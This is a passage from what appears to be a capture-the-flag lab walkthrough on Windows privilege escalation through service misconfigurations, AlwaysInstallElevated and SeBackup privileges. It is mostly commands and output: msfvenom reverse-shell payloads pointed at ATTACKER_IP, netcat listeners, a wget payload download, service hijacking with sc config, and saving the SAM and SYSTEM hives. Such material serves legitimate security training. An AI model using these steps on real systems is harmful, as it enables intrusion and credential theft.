<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4444</span><br><span class="line">Listening on 0.0.0.0 4444</span><br><span class="line">Connection received on 10.10.175.90 50649</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">wprivesc1\taskusr1</span><br></pre></td></tr></table></figure>

<p>Go to taskusr1 desktop to retrieve a flag. Don’t forget to input the flag at the end of this task.</p>
<h5 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h5><p>Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.</p>
<p><strong>Note:</strong> The AlwaysInstallElevated method won’t work on this room’s machine and it’s included as information only.</p>
<p>This method requires two registry values to be set. You can query these from the command line using the commands below.</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v \AlwaysInstallElevated</span><br><span class="line">C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v \AlwaysInstallElevated</span><br></pre></td></tr></table></figure>

<p>To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using <code>msfvenom</code>, as seen below:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.75.172 LPORT=LOCAL_PORT -f msi -o malicious.msi</span><br></pre></td></tr></table></figure>

<p>As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</span><br></pre></td></tr></table></figure>

<h3 id="Abusing-Service-Misconfigurations"><a href="#Abusing-Service-Misconfigurations" class="headerlink" title="Abusing Service Misconfigurations"></a>Abusing Service Misconfigurations</h3><h5 id="Windows-Services"><a href="#Windows-Services" class="headerlink" title="Windows Services"></a>Windows Services</h5><p>Windows services are managed by the <strong>Service Control Manager</strong> (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.</p>
<p>Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.</p>
<p>To better understand the structure of a service, let’s check the apphostsvc service configuration with the <code>sc qc</code> command:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc qc apphostsvc</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: apphostsvc</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Application Host Helper Service</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : localSystem</span><br></pre></td></tr></table></figure>

<p>Here we can see that the associated executable is specified through the <strong>BINARY_PATH_NAME</strong> parameter, and the account used to run the service is shown on the <strong>SERVICE_START_NAME</strong> parameter.</p>
<p>Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine’s desktop):</p>
<p><img src="/img/loading.gif" data-original="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d8244cfd9d64a7be30f5fb0308fd0806.png" alt="Service DACL"></p>
<p>All of the services configurations are stored on the registry under <code>HKLM\SYSTEM\CurrentControlSet\Services\</code>:</p>
<p><img src="/img/loading.gif" data-original="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06c05c134e4922ec8ff8d9b56382c58f.png" alt="Service registry entries"></p>
<p>A subkey exists for every service in the system. Again, we can see the associated executable on the <strong>ImagePath</strong> value and the account used to start the service on the <strong>ObjectName</strong> value. If a DACL has been configured for the service, it will be stored in a subkey called <strong>Security</strong>. As you have guessed by now, only administrators can modify such registry entries by default.</p>
<h5 id="Insecure-Permissions-on-Service-Executable"><a href="#Insecure-Permissions-on-Service-Executable" class="headerlink" title="Insecure Permissions on Service Executable"></a>Insecure Permissions on Service Executable</h5><p>If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service’s account trivially.</p>
<p>To understand how this works, let’s look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using <code>sc</code>:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc qc WindowsScheduler</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: windowsscheduler</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 0   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : System Scheduler Service</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : .\svcuser1</span><br></pre></td></tr></table></figure>

<p>We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in <code>C:\Progra~2\System~1\WService.exe</code>. We then proceed to check the permissions on the executable:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\thm-unpriv&gt;icacls C:\PROGRA~2\SYSTEM~1\WService.exe</span><br><span class="line">C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)</span><br><span class="line">                                  NT AUTHORITY\SYSTEM:(I)(F)</span><br><span class="line">                                  BUILTIN\Administrators:(I)(F)</span><br><span class="line">                                  BUILTIN\Users:(I)(RX)</span><br><span class="line">                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)</span><br><span class="line">                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></table></figure>

<p>And here we have something interesting. The Everyone group has modify permissions (M) on the service’s executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.</p>
<p>Let’s generate an exe-service payload using msfvenom and serve it through a python webserver:</p>
<p>Kali Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe</span><br><span class="line"></span><br><span class="line">user@attackerpc$ python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>

<p>We can then pull the payload from Powershell with the following command:</p>
<p>Powershell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe</span><br></pre></td></tr></table></figure>

<p>Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we’ll want to grant full permissions to the Everyone group as well:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; cd C:\PROGRA~2\SYSTEM~1\</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move WService.exe WService.exe.bkp</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move C:\Users\thm-unpriv\rev-svc.exe WService.exe</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; icacls WService.exe /grant Everyone:F</span><br><span class="line">        Successfully processed 1 files.</span><br></pre></td></tr></table></figure>

<p>We start a reverse listener on our attacker machine:</p>
<p>Kali Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4445</span><br></pre></td></tr></table></figure>

<p>And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc stop windowsscheduler</span><br><span class="line">C:\&gt; sc start windowsscheduler</span><br></pre></td></tr></table></figure>

<p><strong>Note:</strong> PowerShell has <code>sc</code> as an alias to <code>Set-Content</code>, therefore you need to use <code>sc.exe</code> in order to control services with PowerShell this way.</p>
<p>As a result, you’ll get a reverse shell with svcusr1 privileges:</p>
<p>Kali Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4445</span><br><span class="line">Listening on 0.0.0.0 4445</span><br><span class="line">Connection received on 10.10.175.90 50649</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">wprivesc1\svcusr1</span><br></pre></td></tr></table></figure>

<p>Go to svcusr1 desktop to retrieve a flag. Don’t forget to input the flag at the end of this task.</p>
<h5 id="Unquoted-Service-Paths"><a href="#Unquoted-Service-Paths" class="headerlink" title="Unquoted Service Paths"></a>Unquoted Service Paths</h5><p>When we can’t directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.</p>
<p>When working with Windows services, a very particular behaviour occurs when the service is configured to point to an “unquoted” executable. By unquoted, we mean that the path of the associated executable isn’t properly quoted to account for spaces on the command.</p>
<p>As an example, let’s look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by <code>&quot;C:\Program Files\RealVNC\VNC Server\vncserver.exe&quot;</code>, followed by the given parameters:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc qc &quot;vncserver&quot;</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: vncserver</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 0   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : &quot;C:\Program Files\RealVNC\VNC Server\vncserver.exe&quot; -service</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : VNC Server</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>

<p><strong>Remember: PowerShell has ‘sc’ as an alias to ‘Set-Content’, therefore you need to use ‘sc.exe’ to control services if you are in a PowerShell prompt.</strong><br>Now let’s look at another service without proper quotation:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc qc &quot;disk sorter enterprise&quot;</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: disk sorter enterprise</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 0   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Disk Sorter Enterprise</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : .\svcusr2</span><br></pre></td></tr></table></figure>

<p>When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the “Disk Sorter Enterprise” folder, the command becomes ambiguous, and the SCM doesn’t know which of the following you are trying to execute:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>Command</td>
<td>Argument 1</td>
<td>Argument 2</td>
</tr>
<tr>
<td>C:\MyPrograms\Disk.exe</td>
<td>Sorter</td>
<td>Enterprise\bin\disksrs.exe</td>
</tr>
<tr>
<td>C:\MyPrograms\Disk Sorter.exe</td>
<td>Enterprise\bin\disksrs.exe</td>
<td></td>
</tr>
<tr>
<td>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the “right” interpretation of the unquoted command would be to execute <code>C:\\MyPrograms\\Disk.exe</code> and take the rest as arguments.</p>
<p>Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:</p>
<ol>
<li>First, search for <code>C:\\MyPrograms\\Disk.exe</code>. If it exists, the service will run this executable.</li>
<li>If the latter doesn’t exist, it will then search for <code>C:\\MyPrograms\\Disk Sorter.exe</code>. If it exists, the service will run this executable.</li>
<li>If the latter doesn’t exist, it will then search for <code>C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code>. This option is expected to succeed and will typically be run in a default installation.</li>
</ol>
<p>From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.</p>
<p>While this sounds trivial, most of the service executables will be installed under <code>C:\Program Files</code> or <code>C:\Program Files (x86)</code> by default, which isn’t writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.</p>
<p>In our case, the Administrator installed the Disk Sorter binaries under <code>c:\MyPrograms</code>. By default, this inherits the permissions of the <code>C:\</code> directory, which allows any user to create files and folders in it. We can check this using <code>icacls</code>:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;icacls c:\MyPrograms</span><br><span class="line">c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)</span><br><span class="line">              BUILTIN\Administrators:(I)(OI)(CI)(F)</span><br><span class="line">              BUILTIN\Users:(I)(OI)(CI)(RX)</span><br><span class="line">              BUILTIN\Users:(I)(CI)(AD)</span><br><span class="line">              BUILTIN\Users:(I)(CI)(WD)</span><br><span class="line">              CREATOR OWNER:(I)(OI)(CI)(IO)(F)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></table></figure>

<p>The <code>BUILTIN\\Users</code> group has <strong>AD</strong> and <strong>WD</strong> privileges, allowing the user to create subdirectories and files, respectively.</p>
<p>The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:</p>
<p>Kali Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe</span><br><span class="line"></span><br><span class="line">user@attackerpc$ nc -lvp 4446</span><br></pre></td></tr></table></figure>

<p>Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to <code>C:\MyPrograms\Disk.exe</code>. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe</span><br><span class="line"></span><br><span class="line">C:\&gt; icacls C:\MyPrograms\Disk.exe /grant Everyone:F</span><br><span class="line">        Successfully processed 1 files.</span><br></pre></td></tr></table></figure>

<p>Once the service gets restarted, your payload should execute:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc stop &quot;disk sorter enterprise&quot;</span><br><span class="line">C:\&gt; sc start &quot;disk sorter enterprise&quot;</span><br></pre></td></tr></table></figure>

<p>As a result, you’ll get a reverse shell with svcusr2 privileges:</p>
<p>Kali Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4446</span><br><span class="line">Listening on 0.0.0.0 4446</span><br><span class="line">Connection received on 10.10.175.90 50650</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">wprivesc1\svcusr2</span><br></pre></td></tr></table></figure>

<p>Go to svcusr2 desktop to retrieve a flag. Don’t forget to input the flag at the end of this task.</p>
<h5 id="Insecure-Service-Permissions"><a href="#Insecure-Service-Permissions" class="headerlink" title="Insecure Service Permissions"></a>Insecure Service Permissions</h5><p>You might still have a slight chance of taking advantage of a service if the service’s executable DACL is well configured, and the service’s binary path is rightly quoted. Should the service DACL (not the service’s executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.</p>
<p>To check for a service DACL from the command line, you can use <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">Accesschk</a> from the Sysinternals suite. For your convenience, a copy is available at <code>C:\\tools</code>. The command to check for the thmservice service DACL is:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\AccessChk&gt; accesschk64.exe -qlc thmservice</span><br><span class="line">  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_QUERY_STATUS</span><br><span class="line">        SERVICE_QUERY_CONFIG</span><br><span class="line">        SERVICE_INTERROGATE</span><br><span class="line">        SERVICE_ENUMERATE_DEPENDENTS</span><br><span class="line">        SERVICE_PAUSE_CONTINUE</span><br><span class="line">        SERVICE_START</span><br><span class="line">        SERVICE_STOP</span><br><span class="line">        SERVICE_USER_DEFINED_CONTROL</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br></pre></td></tr></table></figure>

<p>Here we can see that the <code>BUILTIN\\Users</code> group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.</p>
<p>Before changing the service, let’s build another exe-service reverse shell and start a listener for it on the attacker’s machine:</p>
<p>Kali Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe</span><br><span class="line"></span><br><span class="line">user@attackerpc$ nc -lvp 4447</span><br></pre></td></tr></table></figure>

<p>We will then transfer the reverse shell executable to the target machine and store it in <code>C:\Users\thm-unpriv\rev-svc3.exe</code>. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F</span><br></pre></td></tr></table></figure>

<p>To change the service’s associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc config THMService binPath= &quot;C:\Users\thm-unpriv\rev-svc3.exe&quot; obj= LocalSystem</span><br></pre></td></tr></table></figure>

<p>Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc stop THMService</span><br><span class="line">C:\&gt; sc start THMService</span><br></pre></td></tr></table></figure>

<p>And we will receive a shell back in our attacker’s machine with SYSTEM privileges:</p>
<p>Kali Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4447</span><br><span class="line">Listening on 0.0.0.0 4447</span><br><span class="line">Connection received on 10.10.175.90 50650</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

<h3 id="Abusing-dangerous-privileges"><a href="#Abusing-dangerous-privileges" class="headerlink" title="Abusing dangerous privileges"></a>Abusing dangerous privileges</h3><p><a target="_blank" rel="noopener" href="https://github.com/gtworek/Priv2Admin">https://github.com/gtworek/Priv2Admin</a></p>
<h5 id="Windows-Privileges"><a href="#Windows-Privileges" class="headerlink" title="Windows Privileges"></a>Windows Privileges</h5><p>Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.</p>
<p>Each user has a set of assigned privileges that can be checked with the following command:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>

<p>A complete list of available privileges on Windows systems is available <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">here</a>. From an attacker’s standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the <a target="_blank" rel="noopener" href="https://github.com/gtworek/Priv2Admin">Priv2Admin</a> Github project.</p>
<p>While we won’t take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.</p>
<h5 id="SeBackup-x2F-SeRestore"><a href="#SeBackup-x2F-SeRestore" class="headerlink" title="SeBackup &#x2F; SeRestore"></a>SeBackup &#x2F; SeRestore</h5><p>The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.</p>
<p>This account is part of the “Backup Operators” group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the “Open as administrator” option to use these privileges. We will be asked to input our password again to get an elevated console:</p>
<p><img src="/img/loading.gif" data-original="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/befb434f15dbd4deee0654f8b6ef6de0.png" alt="Run as admin"></p>
<p>Once on the command prompt, we can check our privileges with the following command:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Disabled</span><br><span class="line">SeRestorePrivilege            Restore files and directories  Disabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span><br></pre></td></tr></table></figure>

<p>To backup the SAM and SYSTEM hashes, we can use the following commands:</p>
<p>Command Prompt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; reg save hklm\system C:\Users\THMBackup\system.hive</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">C:\&gt; reg save hklm\sam C:\Users\THMBackup\sam.hive</span><br><span class="line">The operation completed successfully.</span><br></pre></td></tr></table></figure>

<p>This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket’s <code>smbserver.py</code> to start a simple SMB server with a network share in the current directory of our AttackBox:</p>
<p>Kali Linux</p>
